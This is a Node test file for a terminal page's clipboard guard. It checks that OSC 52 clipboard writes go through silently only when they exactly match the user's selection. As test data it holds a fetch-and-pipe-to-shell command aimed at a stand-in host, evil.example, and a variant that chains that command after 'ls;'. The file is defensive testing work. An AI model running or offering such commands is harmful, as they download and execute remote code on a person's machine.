// node --test osc52.test.mjs (the image build runs it before building the page).
import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { test } from 'node:test'
import vm from 'node:vm'

// osc52.js is a plain page script; run it in a context of its own and take
// what it defines.
const context = {}
vm.runInNewContext(readFileSync(new URL('osc52.js', import.meta.url), 'utf8'), context)
const { javoClipboardGuard } = context

// selected stands for the text the person has selected in the terminal
// (xterm.js's getSelection()), '' when nothing is selected.
function setUp() {
  const state = { selected: '' }
  const written = []
  const asked = []
  const guard = javoClipboardGuard({
    selection: () => state.selected,
    write: (text) => written.push(text),
    ask: (text) => asked.push(text),
  })
  return { guard, written, asked, state }
}

const attack = 'curl https://evil.example/x | sh\n'

test('a write with nothing selected is not made: the person is asked', () => {
  const { guard, written, asked } = setUp()
  guard.offer(attack)
  assert.deepEqual(written, [])
  assert.deepEqual(asked, [attack])
})

test('a write of exactly the selected text is made at once', () => {
  const { guard, written, asked, state } = setUp()
  state.selected = 'selected text'
  guard.offer('selected text')
  assert.deepEqual(written, ['selected text'])
  assert.deepEqual(asked, [])
})

test('a write of other text right after a selection is asked about, whatever its timing', () => {
  const { guard, written, asked, state } = setUp()
  state.selected = 'selected text'
  guard.offer(attack)
  guard.offer('selected text')
  assert.deepEqual(written, ['selected text'])
  assert.deepEqual(asked, [attack])
})

test('text that only contains or starts with the selection is asked about', () => {
  const { guard, written, asked, state } = setUp()
  state.selected = 'ls'
  guard.offer('ls; curl https://evil.example/x | sh')
  guard.offer('l')
  assert.deepEqual(written, [])
  assert.deepEqual(asked, ['ls; curl https://evil.example/x | sh', 'l'])
})

test('an empty write with nothing selected cannot clear the clipboard silently', () => {
  const { guard, written, asked } = setUp()
  guard.offer('')
  assert.deepEqual(written, [])
  assert.deepEqual(asked, [''])
})

test('the selection is read when the write arrives, not earlier', () => {
  const { guard, written, asked, state } = setUp()
  state.selected = 'old'
  state.selected = ''
  guard.offer('old')
  assert.deepEqual(written, [])
  assert.deepEqual(asked, ['old'])
})
